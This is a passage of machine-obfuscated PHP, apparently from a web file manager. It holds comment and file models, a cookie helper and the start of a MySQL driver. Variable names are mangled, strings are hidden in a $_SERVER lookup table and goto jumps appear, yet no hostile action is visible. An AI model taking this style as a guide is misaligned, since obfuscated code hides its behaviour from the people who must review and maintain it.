Model($ë©ë´âÉ[522])->userListInfo($ööÑï); return $™ÖçÓ³; } public function remove($Í°ˆÁ·…) { $òäùÈç™ =& $_SERVER[Ü©»’·]; $…®µ—Ñ¢ = array($òäùÈç™[1888] => $Í°ˆÁ·…); $¶òòá¼ = $this->where($…®µ—Ñ¢)->find(); if ($¶òòá¼[$òäùÈç™[1887]]) { $this->where(array($òäùÈç™[1888] => $¶òòá¼[$òäùÈç™[1887]]))->setAdd($òäùÈç™[1889], -1); } return $this->where($…®µ—Ñ¢)->delete(); } public function edit($‚ßŸŠ„—, $ìŠ±å«„) { $Ö™‡¾¹ =& $_SERVER[Ü©»’·]; $µ‘¡„Ÿ = array($Ö™‡¾¹[1888] => $‚ßŸŠ„—); return $this->where($µ‘¡„Ÿ)->save(array($Ö™‡¾¹[1897] => $ìŠ±å«„)); } public function prasise($´É”¼…Ñ) { $³ıºË‚Î =& $_SERVER[Ü©»’·]; $¿İÛÀÓ¼ = Model($³ıºË‚Î[1898]); $ÆÚ”Óâ = array($³ıºË‚Î[1888] => $´É”¼…Ñ, $³ıºË‚Î[1660] => USER_ID); $‚ù«Ô = $¿İÛÀÓ¼->where($ÆÚ”Óâ)->find(); if (!$‚ù«Ô) { $¿İÛÀÓ¼->add($ÆÚ”Óâ); $ãÚµâÜŒ = $this->where(array($³ıºË‚Î[1888] => $´É”¼…Ñ))->setAdd($³ıºË‚Î[1890], 1); } else { $¿İÛÀÓ¼->where($ÆÚ”Óâ)->delete(); $ãÚµâÜŒ = $this->where(array($³ıºË‚Î[1888] => $´É”¼…Ñ))->setAdd($³ıºË‚Î[1890], -1); } return $ãÚµâÜŒ; } public function targetInfo($õ®ï–¦õ, $°—µèû) { $•ÎŞâ»ƒ =& $_SERVER[Ü©»’·]; $–Ş…î¼å = array($•ÎŞâ»ƒ[595] => $õ®ï–¦õ, $•ÎŞâ»ƒ[596] => $°—µèû); $˜÷é¹Ì‰ = $this->where($–Ş…î¼å)->count(); $…ÛÀ‘£ = "\x52\111\107\110\124\x20\112\117\x49\116\40{$this->tablePrefix}\143\x6f\155\155\145\156\x74\137\x70\162\x61\151\x73\145\40\x73\164\141\x72\x20\x6f\x6e\40\143\157\155\x6d\x65\x6e\164\x2e\143\157\x6d\x6d\x65\x6e\164\111\104\x20\75\x20\163\164\141\162\56\143\157\155\x6d\x65\x6e\164\x49\104"; $ÍĞÚ³â— = $this->alias($•ÎŞâ»ƒ[354])->where($–Ş…î¼å)->join($…ÛÀ‘£, $•ÎŞâ»ƒ[1899])->count(); $ÍÕß±â = array($•ÎŞâ»ƒ[1900] => $˜÷é¹Ì‰, $•ÎŞâ»ƒ[1901] => $ÍĞÚ³â—); return $ÍÕß±â; } public function listData($È…½òæ) { $úûÒçµã =& $_SERVER[Ü©»’·]; if (isset($È…½òæ[$úûÒçµã[1902]])) { if ($È…½òæ[$úûÒçµã[1902]]) { $È…½òæ[$úûÒçµã[1895]] = array($úûÒçµã[1017], intval($È…½òæ[$úûÒçµã[1902]])); } unset($È…½òæ[$úûÒçµã[1902]]); } if (isset($È…½òæ[$úûÒçµã[1903]])) { if ($È…½òæ[$úûÒçµã[1903]]) { $È…½òæ[$úûÒçµã[1895]] = array($úûÒçµã[1014], intval($È…½òæ[$úûÒçµã[1903]])); } unset($È…½òæ[$úûÒçµã[1903]]); } return $this->_listData($È…½òæ); } private function _listData($Áº§òÕÆ) { $Êå†¢ª =& $_SERVER[Ü©»’·]; $ìßİÓ = $this->where($Áº§òÕÆ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ìßİÓ[$Êå†¢ª[378]]); $this->_listAppendUser($ìßİÓ[$Êå†¢ª[378]]); $this->_listAppendMeta($ìßİÓ[$Êå†¢ª[378]]); return $ìßİÓ; } private function _makeOrder() { $²éığªÁ =& $_SERVER[Ü©»’·]; $ÖÑ¼±´ı = array($²éığªÁ[1890], $²éığªÁ[1889], $²éığªÁ[200]); $é·—º½ = Input::get($²éığªÁ[466], $²éığªÁ[7], $²éığªÁ[432], $ÖÑ¼±´ı); $öñÜš = Input::get($²éığªÁ[467], $²éığªÁ[7], $²éığªÁ[1662], array($²éığªÁ[1904], $²éığªÁ[462])); $›ÈÊÂ­ = $é·—º½ . $²éığªÁ[53] . $öñÜš; return $this->order($›ÈÊÂ­); } private function _listAppendParent(&$üİÑ¤ãã) { $œ³—çø± =& $_SERVER[Ü©»’·]; $Ã‡¿™¢… = array_unique(array_to_keyvalue($üİÑ¤ãã, $œ³—çø±[12], $œ³—çø±[1887])); $Ã‡¿™¢… = array_remove_value($Ã‡¿™¢…, $œ³—çø±[197]); if (!$Ã‡¿™¢…) { return; } $¡ŒØú— = $this->where(array($œ³—çø±[1888] => array($œ³—çø±[7], $Ã‡¿™¢…)))->select(); $¡ŒØú— = array_to_keyvalue($¡ŒØú—, $œ³—çø±[1895]); foreach ($üİÑ¤ãã as &$¸”³ı) { if (isset($¡ŒØú—[$¸”³ı[$œ³—çø±[1887]]])) { $¸”³ı[$œ³—çø±[1905]] = $¡ŒØú—[$¸”³ı[$œ³—çø±[1887]]]; } } unset($¸”³ı); } private function _listAppendUser(&$…÷ö­ÂË) { $âÈ­¤êè =& $_SERVER[Ü©»’·]; $™‡÷ôä = array_unique(array_to_keyvalue($…÷ö­ÂË, $âÈ­¤êè[12], $âÈ­¤êè[1669])); $™‡÷ôä = array_remove_value($™‡÷ôä, $âÈ­¤êè[197]); if (count($™‡÷ôä) == 0) { return; } foreach ($…÷ö­ÂË as $Ü¯±·Í) { if (isset($Ü¯±·Í[$âÈ­¤êè[1905]])) { $™‡÷ôä[] = $Ü¯±·Í[$âÈ­¤êè[1905]][$âÈ­¤êè[1669]]; } } $ò©Œ¥’Ş = Model($âÈ­¤êè[544])->userListInfo($™‡÷ôä); foreach ($…÷ö­ÂË as &$Ü¯±·Í) { $Ü¯±·Í[$âÈ­¤êè[609]] = $ò©Œ¥’Ş[$Ü¯±·Í[$âÈ­¤êè[1669]]]; if (isset($Ü¯±·Í[$âÈ­¤êè[1905]])) { $Ü¯±·Í[$âÈ­¤êè[1905]][$âÈ­¤êè[609]] = $ò©Œ¥’Ş[$Ü¯±·Í[$âÈ­¤êè[1905]][$âÈ­¤êè[1669]]]; } } unset($Ü¯±·Í); } private function _listAppendMeta(&$ØÕêá˜Ì) { $Úµ¦Ö”ù =& $_SERVER[Ü©»’·]; $Ùá½Ş ¡ = array_unique(array_to_keyvalue($ØÕêá˜Ì, $Úµ¦Ö”ù[12], $Úµ¦Ö”ù[1895])); $Ùá½Ş ¡ = array_remove_value($Ùá½Ş ¡, $Úµ¦Ö”ù[197]); if (!$Ùá½Ş ¡) { return; } foreach ($ØÕêá˜Ì as $ª¼Ù‹) { if (isset($ª¼Ù‹[$Úµ¦Ö”ù[1905]])) { $Ùá½Ş ¡[] = $ª¼Ù‹[$Úµ¦Ö”ù[1905]][$Úµ¦Ö”ù[1895]]; } } $¬—’ÓÜ = $this->metaList($Ùá½Ş ¡); if (!$¬—’ÓÜ) { return !1; } foreach ($ØÕêá˜Ì as &$ª¼Ù‹) { $ª¼Ù‹[$Úµ¦Ö”ù[475]] = $¬—’ÓÜ[$ª¼Ù‹[$Úµ¦Ö”ù[1895]]]; if (isset($ª¼Ù‹[$Úµ¦Ö”ù[1905]])) { $ª¼Ù‹[$Úµ¦Ö”ù[1905]][$Úµ¦Ö”ù[475]] = $¬—’ÓÜ[$ª¼Ù‹[$Úµ¦Ö”ù[1905]][$Úµ¦Ö”ù[1895]]]; } } unset($ª¼Ù‹); } private function metaList($Î¾•†£˜) { $‘…ßòö± =& $_SERVER[Ü©»’·]; if (!$Î¾•†£˜) { return array(); } $ßÙØ’¬€ = array($‘…ßòö±[1895] => array($‘…ßòö±[7], $Î¾•†£˜)); $ïÍû± « = Model($‘…ßòö±[1906])->where($ßÙØ’¬€)->select(); $ïÍû± « = array_to_keyvalue_group($ïÍû± «, $‘…ßòö±[1895]); foreach ($ïÍû± « as $ƒàŒä => $³ä÷”²) { $»³ÙıâÃ = array(); foreach ($³ä÷”² as $©çÁï™¬) { $»³ÙıâÃ[$©çÁï™¬[$‘…ßòö±[94]]] = $©çÁï™¬[$‘…ßòö±[383]]; } $ïÍû± «[$ƒàŒä] = $»³ÙıâÃ; } return $ïÍû± « ? $ïÍû± « : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\154\145\137\x63\x6f\156\x74\x65\156\x74\163"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\x54\151\155\145", "\x74\151\x6d\145", "\x69\x6e\163\145\x72\164", "\146\165\156\143\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\145"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\x6d\145" => "\x69\157\x5f\x66\x69\x6c\x65\x5f\155\145\x74\x61", "\x6d\x65\x74\x61\x46\x69\x65\154\144" => "\x66\x69\154\x65\111\104"); public function fileInfo($¼ƒŠû’¤) { $ëœÖÚ¸Á =& $_SERVER[Ü©»’·]; static $„ÌÂƒ§ = array(); if (!isset($„ÌÂƒ§[$¼ƒŠû’¤])) { $½Ï¶Çìõ = $ëœÖÚ¸Á[1907]; $›÷àá€è = Model($ëœÖÚ¸Á[480])->field($½Ï¶Çìõ)->where(array($ëœÖÚ¸Á[478] => $¼ƒŠû’¤))->find(); $„ÌÂƒ§[$¼ƒŠû’¤] = $›÷àá€è; } return $„ÌÂƒ§[$¼ƒŠû’¤]; } public function addFileByContent($¾™·™ˆ“ = '', $€¹øšû­ = '') { $¸í³Ã =& $_SERVER[Ü©»’·]; $Ì«€°ˆŒ = TEMP_PATH . $¸í³Ã[1908]; if (!is_dir($Ì«€°ˆŒ)) { mk_dir($Ì«€°ˆŒ); } $€ğà ‰ = $Ì«€°ˆŒ . $¸í³Ã[1909] . rand_string(16); file_put_contents($€ğà ‰, $¾™·™ˆ“); $é´–×•Ø = $this->addFile($€ğà ‰, $€¹øšû­, !0); if (file_exists($€ğà ‰)) { @unlink($€ğà ‰); } return $é´–×•Ø; } public function createFileName($×ôÛ—Å§, $»¯÷›¬¸ = false, $Äò›Ùƒ‡ = false) { $š‡÷Û×ı =& $_SERVER[Ü©»’·]; $º¢»Ë›© = IO::init($š‡÷Û×ı[8]); $µ´é€ı› = $this->makeFilePath($×ôÛ—Å§, $º¢»Ë›©, $»¯÷›¬¸, $Äò›Ùƒ‡); $ÔŸˆÄ‚î = $º¢»Ë›©->pathFather($µ´é€ı›); static $‡–š¼¿ö = false; $‡Í®ëü¸ = $š‡÷Û×ı[1910] . md5($ÔŸˆÄ‚î); if (!$‡–š¼¿ö && !Cache::get($‡Í®ëü¸)) { $‡–š¼¿ö = !0; $ÖšÅöçî = IO::mkdir($ÔŸˆÄ‚î); if (!IO::exist($ÖšÅöçî . $š‡÷Û×ı[803])) { IO::mkfile($ÖšÅöçî . $š‡÷Û×ı[803]); } Cache::set($‡Í®ëü¸, 1, 3600 * 2); } return $µ´é€ı›; } public function makeFilePath($Éº´ú©¾, $¯İè‹İ•, $ÂşÛë¸§ = false, $‡•õÏˆã = false) { $ßîÖÎÍã =& $_SERVER[Ü©»’·]; $½ûçôù = Model($ßîÖÎÍã[776])->get($ßîÖÎÍã[1911]); $Áé ˜Ÿ = KodIO::defaultIO() . date($ßîÖÎÍã[1912]); $”¹•å = $Áé ˜Ÿ . rand_string(5) . short_id(100); $Éº´ú©¾ = str_replace($ßîÖÎÍã[8], $ßîÖÎÍã[11], KodIO::clear($Éº´ú©¾)); $ı²íØë = $¯İè‹İ•->ext($Éº´ú©¾); if (!$Éº´ú©¾) { $½ûçôù = $ßîÖÎÍã[1913]; } switch ($½ûçôù) { case $ßîÖÎÍã[1914]: $”¹•å = $”¹•å . $ßîÖÎÍã[10] . $¯İè‹İ•->ext($Éº´ú©¾); if ($ı²íØë == $ßîÖÎÍã[1851]) { $”¹•å .= $ßîÖÎÍã[1210]; } break; case $ßîÖÎÍã[1915]: $éîğçş = Model($ßîÖÎÍã[776])->get($ßîÖÎÍã[777]); $¿Œ²¹µø = substr(md5($ßîÖÎÍã[778] . $éîğçş . date($ßîÖÎÍã[754])), 0, 8); $¹”Åê†ã = KodIO::defaultDriver(); $Áé ˜Ÿ = $ßîÖÎÍã[1241] . $¹”Åê†ã[$ßîÖÎÍã[408]] . $ßîÖÎÍã[418] . date($ßîÖÎÍã[1916]) . $¿Œ²¹µø . $ßîÖÎÍã[8]; if ($ı²íØë == $ßîÖÎÍã[1851]) { $Éº´ú©¾ .= $ßîÖÎÍã[1210]; } $¸´ŞÙéî = $ßîÖÎÍã[1917] . $Áé ˜Ÿ . $Éº´ú©¾; CacheLock::lock($¸´ŞÙéî); $”¹•å = $Áé ˜Ÿ . $Éº´ú©¾; if (IO::exist($Áé ˜Ÿ . $Éº´ú©¾)) { $§üä¢”· = substr($Éº´ú©¾, 0, strlen($Éº´ú©¾) - strlen($ı²íØë)); $Â¬¥‚ĞÑ = $‡•õÏˆã ? substr($‡•õÏˆã, 0, 5) : ($ÂşÛë¸§ ? substr($ÂşÛë¸§, 0, 5) : rand_string(5)); $”¹•å = $Áé ˜Ÿ . $§üä¢”· . $Â¬¥‚ĞÑ . $ßîÖÎÍã[10] . $ı²íØë; } if (IO::isTypeObject($”¹•å) && !IO::isUploadServer($”¹•å)) { if (IO::exist($”¹•å)) { return $”¹•å; } $öŠ¾µúø = IO::setContent($”¹•å, $ßîÖÎÍã[12]); if (!$öŠ¾µúø) { show_json($ßîÖÎÍã[1918], !1); } } CacheLock::unlock($¸´ŞÙéî); break; case $ßîÖÎÍã[1913]: break; default: break; } return $”¹•å; } public function addFileByRemote($çàÑşß, $¸§“¦Ôí, $ª½şüÏ = array()) { $½¬ñŞæß =& $_SERVER[Ü©»’·]; if (!IO::exist($çàÑşß)) { return !1; } $’ñ£À³³ = $ª½şüÏ[$½¬ñŞæß[176]] ? $ª½şüÏ[$½¬ñŞæß[176]] : $½¬ñŞæß[12]; $Ä¸‘­Ñ = IO::hashMd5($çàÑşß, $’ñ£À³³); $Üãáãö¿ = KodIO::defaultDriver(); $Äƒ­µ = array($½¬ñŞæß[594] => IO::size($çàÑşß), $½¬ñŞæß[1919] => 1, $½¬ñŞæß[429] => $¸§“¦Ôí, $½¬ñŞæß[814] => $Üãáãö¿[$½¬ñŞæß[408]], $½¬ñŞæß[430] => $çàÑşß, $½¬ñŞæß[1920] => $ª½şüÏ[$½¬ñŞæß[177]] ? $ª½şüÏ[$½¬ñŞæß[177]] : IO::hashSimple($çàÑşß), $½¬ñŞæß[1921] => $Ä¸‘­Ñ ? $Ä¸‘­Ñ : $’ñ£À³³); if ($‰‰Ğ«æá = $this->addFileCheckExist($Äƒ­µ[$½¬ñŞæß[177]], $Äƒ­µ[$½¬ñŞæß[176]], $Äƒ­µ[$½¬ñŞæß[76]])) { return $‰‰Ğ«æá; } return $this->addFileData($Äƒ­µ); } private function addFileData($¡Ş²³ÜÇ) { $í•¥åÊç =& $_SERVER[Ü©»’·]; if (!$¡Ş²³ÜÇ) { return !1; } $¡Ş²³ÜÇ[$í•¥åÊç[76]] = intval($¡Ş²³ÜÇ[$í•¥åÊç[76]]); if (!$¡Ş²³ÜÇ[$í•¥åÊç[76]] && strlen($¡Ş²³ÜÇ[$í•¥åÊç[177]]) > 32) { $¡Ş²³ÜÇ[$í•¥åÊç[76]] = intval(substr($¡Ş²³ÜÇ[$í•¥åÊç[177]], 32)); } $ï“Æ•ìä = $this->add($¡Ş²³ÜÇ); return $this->find($ï“Æ•ìä); } public function addFile($‡’¿™¹™, $˜¾ÅÌƒ, $ƒ‰ü°­Ş = false) { $æ˜„À± =& $_SERVER[Ü©»’·]; $êõ¬×—¢ = IO::hashSimple($‡’¿™¹™); $Î´ˆˆ¼¼ = IO::size($‡’¿™¹™); $¦´€Àşğ = $Î´ˆˆ¼¼ <= 1024 * 1024 * 10 ? IO::hashMd5($‡’¿™¹™) : $æ˜„À±[12]; $í„Œ¾Ïš = $æ˜„À±[1922] . $êõ¬×—¢; CacheLock::lock($í„Œ¾Ïš); if ($¦´€Àşğ && $êõ¬×—¢) { $Ì»Îóûğ = $this->addFileCheckExist($êõ¬×—¢, $¦´€Àşğ, $Î´ˆˆ¼¼); if ($Ì»Îóûğ) { CacheLock::unlock($í„Œ¾Ïš); return $Ì»Îóûğ; } } $ÒĞÃØú‡ = $this->addFileMake($‡’¿™¹™, $Î´ˆˆ¼¼, $êõ¬×—¢, $¦´€Àşğ, $˜¾ÅÌƒ, $ƒ‰ü°­Ş); $î¸±ê«÷ = $this->addFileData($ÒĞÃØú‡); CacheLock::unlock($í„Œ¾Ïš); if (!$¦´€Àşğ && $î¸±ê«÷) { $this->fileMd5Check($î¸±ê«÷); } return $î¸±ê«÷; } private function fileMd5Check($¤Ó–šÀ) { $øÑ·ï¾æ =& $_SERVER[Ü©»’·]; $ÕğÉô‘å = array($¤Ó–šÀ[$øÑ·ï¾æ[477]], $¤Ó–šÀ[$øÑ·ï¾æ[84]]); $—ÆÑÅ = $øÑ·ï¾æ[1923] . $¤Ó–šÀ[$øÑ·ï¾æ[84]]; $„¯ÅÚ±½ = $øÑ·ï¾æ[1924] . $¤Ó–šÀ[$øÑ·ï¾æ[477]]; $òËÏ Ó— = TaskQueue::add($øÑ·ï¾æ[1925], $ÕğÉô‘å, $—ÆÑÅ, $„¯ÅÚ±½); if (!$òËÏ Ó—) { $this->fileMd5Set($¤Ó–šÀ[$øÑ·ï¾æ[477]], $¤Ó–šÀ[$øÑ·ï¾æ[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ãÌÙí¼·, $—ñ»©Êæ) { $ ²Ÿø„ú =& $_SERVER[Ü©»’·]; $Ï£±¥çğ = $this->find($ãÌÙí¼·); if (!$Ï£±¥çğ || $Ï£±¥çğ[$ ²Ÿø„ú[176]]) { return; } $Û¤““¿É = IO::hashMd5($—ñ»©Êæ); if (!$Û¤““¿É) { return $ ²Ÿø„ú[12]; } $this->where(array($ ²Ÿø„ú[477] => $ãÌÙí¼·))->save(array($ ²Ÿø„ú[176] => $Û¤““¿É)); } public function addFileMake($Ç©Óóí¬, $­ç¢ã„ç, $¦îò™ù, $Æ¿î©¨÷, $¢ˆÚ•Îå, $ç÷™Ÿù´) { $¬µ”¬¤² =& $_SERVER[Ü©»’·]; $”¯ñËš¾ = $this->createFileName($¢ˆÚ•Îå, $¦îò™ù, $Æ¿î©¨÷); $Í¹¦…º’ = get_path_father($”¯ñËš¾); $¡µ«¸Ä¿ = get_path_this($”¯ñËš¾); if ($ç÷™Ÿù´) { $Ä¼»‰½¸ = IO::move($Ç©Óóí¬, $Í¹¦…º’, !1, $¡µ«¸Ä¿); } else { $Ä¼»‰½¸ = IO::copy($Ç©Óóí¬, $Í¹¦…º’, !1, $¡µ«¸Ä¿); } if (!$Ä¼»‰½¸) { return !1; } $ƒ¾ÆÁ = KodIO::defaultDriver(); $êòÄÚ‰Ğ = array($¬µ”¬¤²[594] => $­ç¢ã„ç, $¬µ”¬¤²[1919] => 1, $¬µ”¬¤²[429] => $¢ˆÚ•Îå, $¬µ”¬¤²[814] => $ƒ¾ÆÁ[$¬µ”¬¤²[408]], $¬µ”¬¤²[430] => $”¯ñËš¾, $¬µ”¬¤²[1920] => $¦îò™ù, $¬µ”¬¤²[1921] => $Æ¿î©¨÷); return $êòÄÚ‰Ğ; } public function addFileCheckExist($Ö“³Â¶®, $‰ê ¾Ëù, $£İı‹ñû) { $ùô¤³×ò =& $_SERVER[Ü©»’·]; $öôëÚĞİ = $this->findByHash($Ö“³Â¶®, $‰ê ¾Ëù); if (!$öôëÚĞİ) { return !1; } $Ç°Ş‚şÃ = array($ùô¤³×ò[1919] => intval($öôëÚĞİ[$ùô¤³×ò[1926]]) + 1, $ùô¤³×ò[594] => $£İı‹ñû); $this->where(array($ùô¤³×ò[478] => $öôëÚĞİ[$ùô¤³×ò[477]]))->save($Ç°Ş‚şÃ); return $öôëÚĞİ; } public function remove($ßÒñÑ…) { $this->linkCountChange($ßÒñÑ…, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÄĞáÌÌ¢) { $this->linkCountChange($ÄĞáÌÌ¢, !0); } public function linkCountChange($ôøî°ÆÏ, $¬ó»ÉØ) { $ı“éİ =& $_SERVER[Ü©»’·]; if (!$ôøî°ÆÏ) { return; } if (!is_array($ôøî°ÆÏ)) { $ôøî°ÆÏ = array($ôøî°ÆÏ); } $â‚È«Ò× = array(); foreach ($ôøî°ÆÏ as $ÎÃ†¥é) { $ÓÕ„“¶± = $ÎÃ†¥é . $ı“éİ[12]; if (!$â‚È«Ò×[$ÓÕ„“¶±]) { $â‚È«Ò×[$ÓÕ„“¶±] = 0; } $â‚È«Ò×[$ÓÕ„“¶±]++; } $üˆµû¿ = array(); foreach ($â‚È«Ò× as $ÎÃ†¥é => $ôë÷ù„æ) { $ÓÕ„“¶± = $ôë÷ù„æ . $ı“éİ[12]; if (!$üˆµû¿[$ÓÕ„“¶±]) { $üˆµû¿[$ÓÕ„“¶±] = array(); } $üˆµû¿[$ÓÕ„“¶±][] = $ÎÃ†¥é; } foreach ($üˆµû¿ as $ôë÷ù„æ => $¾•¹àêÒ) { if (!$¾•¹àêÒ) { continue; } $ôë÷ù„æ = $¬ó»ÉØ ? $ôë÷ù„æ : -intval($ôë÷ù„æ); $¾üÔ²ˆŞ = array($ı“éİ[477] => array($ı“éİ[7], $¾•¹àêÒ)); if ($ôë÷ù„æ < 0) { $¾üÔ²ˆŞ[$ı“éİ[1926]] = array($ı“éİ[1018], abs($ôë÷ù„æ)); } $this->where($¾üÔ²ˆŞ)->setAdd($ı“éİ[1926], $ôë÷ù„æ); } } public function findByHash($Ğòö§Óğ, $ˆå†©¸– = false) { $Îˆ¢Åİ =& $_SERVER[Ü©»’·]; if (!$Ğòö§Óğ && !$ˆå†©¸–) { return !1; } $ÂóŒúçæ = array($Îˆ¢Åİ[1920] => $Ğòö§Óğ); if ($ˆå†©¸–) { $ÂóŒúçæ = array($Îˆ¢Åİ[1921] => $ˆå†©¸–); } return $this->order($Îˆ¢Åİ[1927])->where($ÂóŒúçæ)->find(); } public function clearEmpty($µŞäñÔ = 0) { $Ú‹Üõµˆ =& $_SERVER[Ü©»’·]; $Ä›œ¿ûÉ = time() - 3600 * 24 * $µŞäñÔ; $¤¡ÀšŒ = $Ú‹Üõµˆ[1928] . $Ä›œ¿ûÉ; $™ğíöïó = $this->where($¤¡ÀšŒ)->select(); if (!$™ğíöïó) { return; } $ñ™˜ò´Š = new Task($Ú‹Üõµˆ[1929], $Ú‹Üõµˆ[12], count($™ğíöïó)); foreach ($™ğíöïó as $ÛºÎàûË) { $ñ™˜ò´Š->update(1); $this->resetFile($ÛºÎàûË); } $ñ™˜ò´Š->end(); } public function resetFile($€‡³£Í) { $ôİËàÜ¹ =& $_SERVER[Ü©»’·]; $Ô¾ÕÍ¨× = array($ôİËàÜ¹[478] => $€‡³£Í[$ôİËàÜ¹[477]]); $ÃíàÌ€ = Model($ôİËàÜ¹[1339])->where($Ô¾ÕÍ¨×)->count(); $œ×ôã¨ = Model($ôİËàÜ¹[1930])->where($Ô¾ÕÍ¨×)->count(); $¡±–àÀÇ = intval($ÃíàÌ€) + intval($œ×ôã¨); if ($¡±–àÀÇ == 0) { IO::remove($€‡³£Í[$ôİËàÜ¹[84]]); Model($ôİËàÜ¹[1931])->delete($€‡³£Í[$ôİËàÜ¹[477]]); $this->where($Ô¾ÕÍ¨×)->delete(); $this->metaSet($€‡³£Í[$ôİËàÜ¹[477]], null, null); return; } if ($€‡³£Í[$ôİËàÜ¹[1926]] != $¡±–àÀÇ) { $this->where($Ô¾ÕÍ¨×)->save(array($ôİËàÜ¹[1919] => $¡±–àÀÇ)); } } public function storageInfo($éÑ©Å¡Ã = false) { $ŠÑâª˜ =& $_SERVER[Ü©»’·]; $Ğ¤¯âó = $this->count() + 0.0; $‹³à³‰« = 0; $Ïî Øµğ = 1; $öÅˆä™» = 0; $¦ö¸¦Õü = 5000; for ($ãïõ»öº = 0; $ãïõ»öº < $Ğ¤¯âó; $ãïõ»öº = $ãïõ»öº + $¦ö¸¦Õü) { $ˆëõšÊ = $this->limit($ãïõ»öº, $ãïõ»öº + $¦ö¸¦Õü)->select(); foreach ($ˆëõšÊ as $Ã¤¹é÷ú) { $Ïî Øµğ += $Ã¤¹é÷ú[$ŠÑâª˜[76]] * $Ã¤¹é÷ú[$ŠÑâª˜[1926]]; $‹³à³‰« += $Ã¤¹é÷ú[$ŠÑâª˜[76]] * ($Ã¤¹é÷ú[$ŠÑâª˜[1926]] - 1); $öÅˆä™» += $Ã¤¹é÷ú[$ŠÑâª˜[1926]]; } } $ºÓ¿¬¯ = array($ŠÑâª˜[1932] => $Ïî Øµğ, $ŠÑâª˜[1933] => $‹³à³‰«, $ŠÑâª˜[1934] => $‹³à³‰« / $Ïî Øµğ, $ŠÑâª˜[80] => $Ğ¤¯âó, $ŠÑâª˜[1935] => $öÅˆä™»); return $ºÓ¿¬¯; } } goto CíÃÆŠâ†å; eáÓ£¼¯£: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ªÏõ“Ö¯ = '', $¸¶Üòôœ = 0) { if (is_string($ªÏõ“Ö¯) && $ªÏõ“Ö¯ != $_SERVER[Ü©»’·][12]) { $this->prefix = $ªÏõ“Ö¯; } if (is_numeric($¸¶Üòôœ) && $¸¶Üòôœ > 0) { $this->expire = $¸¶Üòôœ; } } public static function getInstance() { static $§îÁ»Ï; if ($§îÁ»Ï === null) { $§îÁ»Ï = new self(); } return $§îÁ»Ï; } private static $cookieDisable = false; public static function disable($¦ï£±ĞÙ) { self::$cookieDisable = $¦ï£±ĞÙ; } private static $sameCookieSet = array(); public static function set($¿ôí ÷¿, $÷Ã·û¹, $·ÆñÑû„ = 0, $©£Š†˜º = false, $òËÉ´Ø = false) { $÷½„ù© =& $_SERVER[Ü©»’·]; if (self::$cookieDisable) { return; } if (!$·ÆñÑû„) { $·ÆñÑû„ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¿ôí ÷¿]) && self::$sameCookieSet[$¿ôí ÷¿] == $÷Ã·û¹ . $·ÆñÑû„) { return; } self::$sameCookieSet[$¿ôí ÷¿] = $÷Ã·û¹ . $·ÆñÑû„; if (!$òËÉ´Ø) { $òËÉ´Ø = str_replace(HOST, $÷½„ù©[12], APP_HOST); $òËÉ´Ø = _get($GLOBALS, $÷½„ù©[885], $òËÉ´Ø); } $²¦–·È = $÷½„ù©[12]; setcookie($¿ôí ÷¿, $÷Ã·û¹, time() + $·ÆñÑû„, $÷½„ù©[8] . trim($òËÉ´Ø, $÷½„ù©[8]) . $²¦–·È, !1, !1, $©£Š†˜º); } public static function setSafe($ç¬·ÓÓ·, $İÖ¶ç¹, $³í­†á¹ = 0) { self::set($ç¬·ÓÓ·, $İÖ¶ç¹, $³í­†á¹, !0); } public static function get($Ï×ÍöÛ) { static $»¤®«àç = false; if (!$»¤®«àç) { self::initHeaderCookie(); $»¤®«àç = !0; } return isset($_COOKIE[$Ï×ÍöÛ]) ? $_COOKIE[$Ï×ÍöÛ] : !1; } private static function initHeaderCookie() { $Ú—‹»§ =& $_SERVER[Ü©»’·]; if (!isset($_SERVER[$Ú—‹»§[886]]) || !$_SERVER[$Ú—‹»§[886]]) { return; } $óì…—ë = explode($Ú—‹»§[71], $_SERVER[$Ú—‹»§[886]]); foreach ($óì…—ë as $—Ñ¢¹º) { $—Ñ¢¹º = explode($Ú—‹»§[887], $—Ñ¢¹º); if (count($—Ñ¢¹º) != 2 || !isset($—Ñ¢¹º[1])) { continue; } $_COOKIE[trim($—Ñ¢¹º[0])] = trim($—Ñ¢¹º[1]); } } public static function remove($˜ûï¸†Ÿ, $çö·½Ú = false) { unset($_COOKIE[$˜ûï¸†Ÿ]); self::set($˜ûï¸†Ÿ, $_SERVER[Ü©»’·][12], 1, $çö·½Ú); } } class DbMysql extends Db { public function __construct($„«İ·áø = '') { $ÂÚ¦¥÷ =& $_SERVER[Ü©»’·]; if (!extension_loaded($ÂÚ¦¥÷[810])) { think_exception(think_lang($ÂÚ¦¥÷[14]) . $ÂÚ¦¥÷[888]); } if (!empty($„«İ·áø)) { $this->config = $„«İ·áø; if (empty($this->config[$ÂÚ¦¥÷[17]])) { $this->config[$ÂÚ¦¥÷[17]] = $ÂÚ¦¥÷[12]; } } } public function connect($…à£ÇÍÊ = '', $—ùüÖ²ô = 0, $¾­°‘İ§ = false) { $«û¬Ëµ“ =& $_SERVER[Ü©»’·]; if (!isset($this->linkID[$—ùüÖ²ô])) { if (empty($…à£ÇÍÊ)) { $…à£ÇÍÊ = $this->config; } $©˜Ğãº = $…à£ÇÍÊ[$«û¬Ëµ“[889]] . ($…à£ÇÍÊ[$«û¬Ëµ“[890]] ? "\x3a{$…à£ÇÍÊ[$«û¬Ëµ“[890]]}" : $«û¬Ëµ“[12]); $‹²ÇÊáØ = !empty($…à£ÇÍÊ[$«û¬Ëµ“[17]][$«û¬Ëµ“[18]]) ? $…à£ÇÍÊ[$«û¬Ëµ“[17]][$«û¬Ëµ“[18]] : $this->pconnect; if ($‹²ÇÊáØ) { $this->linkID[$—ùüÖ²ô] = mysql_pconnect($©˜Ğãº, $…à£ÇÍÊ[$«û¬Ëµ“[891]], $…à£ÇÍÊ[$«û¬Ëµ“[892]], 131072); } else { $this->linkID[$—ùüÖ²ô] = mysql_connect($©˜Ğãº, $…à£ÇÍÊ[$«û¬Ëµ“[891]], $…à£ÇÍÊ[$«û¬Ëµ“[892]], !0, 131072); } if (!$this->linkID[$—ùüÖ²ô] || 